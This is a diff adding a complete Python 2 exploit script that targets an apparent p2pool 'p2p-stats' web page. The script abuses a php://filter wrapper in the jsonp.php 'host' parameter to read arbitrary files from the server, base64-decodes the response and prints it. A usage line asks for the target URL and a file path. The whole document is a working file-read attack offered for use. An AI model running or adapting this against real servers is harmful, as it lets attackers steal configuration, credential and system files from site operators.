@@ -1,0 +1,36 @@
+#!/usr/bin/python2
+# coding: utf-8
+import requests
+import sys
+import os
+
+def get_file(base_url, target_file):
+    print "[+] Getting %s from %s" %(target_file, base_url)
+    path, file = os.path.split(target_file)
+    query = "host=php://filter/convert.base64-encode/resource=%s/&report=%s&callback=s" %(path, file)
+    url = "%s/jsonp.php?%s" %(base_url, query)
+#    print url # debugging
+    try:
+        r = requests.get(url)
+    #print r.text # debuggering
+    except:
+        sys.exit("request failed. is the target up?")
+    response = r.text
+    try:
+        response = response.replace("s(", "")
+        response = response.replace(");", "")
+        response = response.strip()
+        output = response.decode("base64")
+    except:
+        print r.text
+        sys.exit("output parsing failed")
+    print "[+] Got file, printing...\n\n"
+    print output
+
+def main(args):
+    if len(args) != 3:
+        sys.exit("use: %s http://p2pool/p2p-stats/ /path/to/file" %(args[0]))
+    get_file(base_url=args[1], target_file=args[2])
+
+if __name__ == "__main__":
+    main(args=sys.argv)
